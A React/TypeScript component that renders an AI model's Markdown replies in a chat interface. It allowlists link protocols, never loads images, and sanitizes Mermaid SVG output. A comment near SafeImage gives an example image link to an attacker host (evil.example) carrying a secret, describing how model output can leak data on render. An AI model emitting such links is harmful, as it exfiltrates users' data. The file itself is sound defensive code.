import { isValidElement, useEffect, useMemo, useRef, useState } from 'react';
import type { ComponentPropsWithoutRef, ReactNode } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

// Assistant Markdown rendering (FR-CHAT-07, §12.3). Raw HTML stays disabled by construction:
// we deliberately do not use rehype-raw, so react-markdown/remark-rehype drop any embedded HTML
// as plain text. Link protocols are allowlisted to https/mailto; anything else renders as
// inert plain text instead of an <a>. User messages are never passed through this component.

const SAFE_HREF = /^(https:\/\/|mailto:)/i;

function SafeAnchor({ href, children }: ComponentPropsWithoutRef<'a'>) {
  const safe = typeof href === 'string' && SAFE_HREF.test(href.trim());
  if (!safe) {
    // Unknown/unsafe protocol: keep the visible text but never make it a clickable link.
    return <span className="md-link-plain">{children}</span>;
  }
  return (
    // External open is Phase 4 — for now clicking only reveals the destination via the title.
    <a href={href} title={href} rel="noopener noreferrer" onClick={(e) => e.preventDefault()}>
      {children}
    </a>
  );
}

// Markdown images are an attacker-influenceable network fetch: assistant output can embed
// `![x](https://evil.example/track?leak=SECRET)` to exfiltrate data the moment the message
// renders (React itself eagerly preloads `<img src>` via a speculative `<link rel="preload">`,
// so even "never visible" framing does not help). No src ever reaches the DOM; only the alt
// text (or, failing that, the raw URL) renders as inert text, mirroring SafeAnchor above.
function SafeImage({ alt, src }: ComponentPropsWithoutRef<'img'>) {
  const label =
    typeof alt === 'string' && alt.length > 0 ? alt : typeof src === 'string' ? src : '画像';
  return (
    <span className="md-image-plain" title={typeof src === 'string' ? src : undefined}>
      {label}
    </span>
  );
}

type MarkdownElementProps<Tag extends 'pre' | 'table'> = ComponentPropsWithoutRef<Tag> & {
  node?: unknown;
};

function StandardPreBlock({ children, node, ...rest }: MarkdownElementProps<'pre'>) {
  void node;
  const preRef = useRef<HTMLPreElement>(null);
  const [copied, setCopied] = useState(false);

  function handleCopy() {
    const text = preRef.current?.textContent ?? '';
    if (!text) return;
    navigator.clipboard
      ?.writeText(text)
      .then(() => {
        setCopied(true);
        window.setTimeout(() => setCopied(false), 1500);
      })
      .catch(() => undefined);
  }

  return (
    <div className="md-pre-wrap">
      <button type="button" className="md-copy-btn" onClick={handleCopy}>
        {copied ? 'コピーしました' : 'コピー'}
      </button>
      <pre ref={preRef} {...rest}>
        {children}
      </pre>
    </div>
  );
}

const MAX_MERMAID_SOURCE_LENGTH = 20_000;
const MAX_MERMAID_LINES = 300;
const MAX_MERMAID_DIAGRAMS = 4;
const MAX_MERMAID_TOTAL_SOURCE_LENGTH = 40_000;
const MERMAID_RESOURCE_REFERENCE =
  /(?:https?:)?\/\/|(?:data|file|javascript|vbscript):|url\s*\(|<\s*(?:img|image|link|style)\b|@\{[^}]*\bimg\s*:|\b(?:image|icon|themeCSS)\s*:/i;
let nextMermaidId = 1;

function mermaidSource(children: ReactNode): string | null {
  if (!isValidElement<{ className?: string; children?: ReactNode }>(children)) return null;
  if (children.props.className !== 'language-mermaid') return null;
  return String(children.props.children ?? '').replace(/\n$/, '');
}

function PreBlock(props: MarkdownElementProps<'pre'> & { isStreaming: boolean }) {
  const { isStreaming, children, ...rest } = props;
  const source = mermaidSource(children);
  if (source === null || isStreaming)
    return <StandardPreBlock {...rest}>{children}</StandardPreBlock>;
  return (
    <MermaidDiagram
      source={source}
      fallback={<StandardPreBlock {...rest}>{children}</StandardPreBlock>}
    />
  );
}

function MermaidDiagram({ source, fallback }: { source: string; fallback: ReactNode }) {
  const [rendered, setRendered] = useState<{ source: string; svg: string } | null>(null);
  const invalidInput =
    source.length === 0 ||
    source.length > MAX_MERMAID_SOURCE_LENGTH ||
    source.split('\n').length > MAX_MERMAID_LINES ||
    MERMAID_RESOURCE_REFERENCE.test(source);

  useEffect(() => {
    if (invalidInput) return;
    let current = true;
    const id = `sprint-coder-mermaid-${nextMermaidId++}`;
    void import('mermaid')
      .then(async ({ default: mermaid }) => {
        mermaid.initialize({
          startOnLoad: false,
          securityLevel: 'strict',
          htmlLabels: false,
          flowchart: { htmlLabels: false },
          suppressErrorRendering: true,
        });
        const rendered = await mermaid.render(id, source);
        if (current) setRendered({ source, svg: sanitizeMermaidSvg(rendered.svg) });
      })
      .catch(() => {
        if (current) setRendered(null);
      });
    return () => {
      current = false;
    };
  }, [invalidInput, source]);

  const svg = rendered?.source === source ? rendered.svg : null;
  if (invalidInput || svg === null) return fallback;
  return (
    <div
      className="md-mermaid"
      role="img"
      aria-label="会話内の図"
      dangerouslySetInnerHTML={{ __html: svg }}
    />
  );
}

export function sanitizeMermaidSvg(svg: string): string {
  const document = new DOMParser().parseFromString(svg, 'image/svg+xml');
  const root = document.documentElement;
  if (root.localName !== 'svg' || document.querySelector('parsererror') !== null)
    throw new Error('Invalid Mermaid SVG');
  const nonElementNodes = document.createNodeIterator(
    root,
    NodeFilter.SHOW_CDATA_SECTION |
      NodeFilter.SHOW_COMMENT |
      NodeFilter.SHOW_PROCESSING_INSTRUCTION,
  );
  const nodesToRemove: Node[] = [];
  for (let node = nonElementNodes.nextNode(); node !== null; node = nonElementNodes.nextNode())
    nodesToRemove.push(node);
  for (const node of nodesToRemove) node.parentNode?.removeChild(node);
  const allowedTags = new Set([
    'svg',
    'g',
    'path',
    'rect',
    'circle',
    'ellipse',
    'line',
    'polyline',
    'polygon',
    'text',
    'tspan',
    'defs',
    'marker',
    'lineargradient',
    'radialgradient',
    'stop',
    'clippath',
    'mask',
    'pattern',
    'title',
    'desc',
    'use',
  ]);
  const allowedAttributes = new Set([
    'id',
    'class',
    'role',
    'aria-label',
    'aria-labelledby',
    'aria-describedby',
    'xmlns',
    'viewbox',
    'width',
    'height',
    'x',
    'y',
    'x1',
    'x2',
    'y1',
    'y2',
    'cx',
    'cy',
    'r',
    'rx',
    'ry',
    'd',
    'points',
    'transform',
    'opacity',
    'fill',
    'fill-opacity',
    'fill-rule',
    'stroke',
    'stroke-width',
    'stroke-opacity',
    'stroke-linecap',
    'stroke-linejoin',
    'stroke-dasharray',
    'stroke-dashoffset',
    'font-family',
    'font-size',
    'font-style',
    'font-weight',
    'text-anchor',
    'dominant-baseline',
    'dx',
    'dy',
    'offset',
    'stop-color',
    'stop-opacity',
    'gradientunits',
    'gradienttransform',
    'spreadmethod',
    'markerwidth',
    'markerheight',
    'markerunits',
    'orient',
    'refx',
    'refy',
    'preserveaspectratio',
    'clip-path',
    'mask',
    'marker-start',
    'marker-mid',
    'marker-end',
    'href',
    'xlink:href',
  ]);
  for (const element of [...document.querySelectorAll('*')]) {
    if (!allowedTags.has(element.localName.toLowerCase())) {
      element.remove();
      continue;
    }
    for (const attribute of [...element.attributes]) {
      const name = attribute.name.toLowerCase();
      const value = attribute.value.trim();
      const urlReferences = [...value.matchAll(/url\(\s*(['"]?)([^)'"\s]+)\1\s*\)/gi)].map(
        (match) => match[2] ?? '',
      );
      if (!allowedAttributes.has(name)) element.removeAttribute(attribute.name);
      else if ((name === 'href' || name === 'xlink:href') && !/^#[A-Za-z_][\w:.-]*$/.test(value))
        element.removeAttribute(attribute.name);
      else if (
        /url\s*\(/i.test(value) &&
        (urlReferences.length === 0 ||
          urlReferences.some((reference) => !/^#[A-Za-z_][\w:.-]*$/.test(reference)))
      )
        element.removeAttribute(attribute.name);
    }
  }
  return new XMLSerializer().serializeToString(root);
}

function TableBlock({ children, node, ...rest }: MarkdownElementProps<'table'>) {
  void node;
  return (
    <div className="md-table-wrap">
      <table {...rest}>{children}</table>
    </div>
  );
}

export function Markdown({
  content,
  isStreaming = false,
}: {
  content: string;
  isStreaming?: boolean;
}) {
  const components = useMemo(
    () => ({
      a: SafeAnchor,
      pre: (props: MarkdownElementProps<'pre'>) => (
        <PreBlock {...props} isStreaming={isStreaming} />
      ),
      img: SafeImage,
      table: TableBlock,
    }),
    [isStreaming],
  );
  return (
    <div className="md-body">
      <ReactMarkdown remarkPlugins={[remarkGfm, remarkMermaidBudget]} components={components}>
        {content}
      </ReactMarkdown>
    </div>
  );
}

function remarkMermaidBudget() {
  return (tree: unknown): void => {
    let diagrams = 0;
    let totalSourceLength = 0;
    const walk = (node: unknown): void => {
      if (typeof node !== 'object' || node === null) return;
      const record = node as {
        type?: unknown;
        lang?: unknown;
        value?: unknown;
        children?: unknown;
      };
      if (record.type === 'code' && record.lang === 'mermaid') {
        diagrams += 1;
        totalSourceLength += typeof record.value === 'string' ? record.value.length : 0;
        if (diagrams > MAX_MERMAID_DIAGRAMS || totalSourceLength > MAX_MERMAID_TOTAL_SOURCE_LENGTH)
          record.lang = 'mermaid-fallback';
      }
      if (Array.isArray(record.children)) for (const child of record.children) walk(child);
    };
    walk(tree);
  };
}
